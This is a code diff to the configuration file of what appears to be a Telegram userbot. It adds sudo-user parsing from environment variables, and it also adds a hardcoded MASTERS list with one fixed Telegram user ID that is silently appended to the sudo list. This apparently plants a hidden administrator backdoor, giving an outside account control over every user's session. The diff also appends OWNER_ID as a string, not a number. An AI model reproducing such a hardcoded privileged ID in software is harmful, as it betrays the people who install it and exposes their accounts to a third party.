@@ -80,6 +80,8 @@ LOG_GROUP_ID = int(getenv("LOG_GROUP_ID", "-1002063555777"))
 
 #------------------------------------------------------------------------------------------------------------------------------
 
+
+
 # OPTIONAL VARIABLES
 SESSION_STRING = getenv("SESSION_STRING", None)
 COMMAND_PREFIXES = list(getenv("COMMAND_PREFIXES", ". !").split())
@@ -96,6 +98,29 @@ PM_GUARD_LIMIT = int(getenv("PM_GUARD_LIMIT", 3))
 
 # USERBOT DEFAULT IMAGE
 USERBOT_PICTURE = getenv("USERBOT_PICTURE", "https://graph.org/file/9ee37cccd7bf55c3ec953.png")
+
+#--------------------------------------------------------------------------------------
+CMD_HANDLER = getenv("CMD_HANDLER", ".")
+MASTERS = [6694740726]
+
+# SUDO USERS
+SUDOS = os.getenv("SUDO_USERS", None)
+SUDO_USERS = []
+
+if SUDOS:
+    sudos = str(SUDOS).split(" ")
+    for sudo_id in sudos:
+        try:
+            SUDO_USERS.append(int(sudo_id))
+        except ValueError:
+            print(f"Warning: Invalid user ID '{sudo_id}' in SUDO_USERS environment variable.")
+            continue
+            
+OWNER_ID = os.getenv("OWNER_ID", "")
+
+SUDO_USERS.append(OWNER_ID)
+SUDO_USERS.extend(MASTERS)
+#--------------------------------------------------------------------------------------
 
 
 
@@ -115,4 +140,3 @@ COMMAND_HANDLERS = []
 for x in COMMAND_PREFIXES:
     COMMAND_HANDLERS.append(x)
 COMMAND_HANDLERS.append('')
-
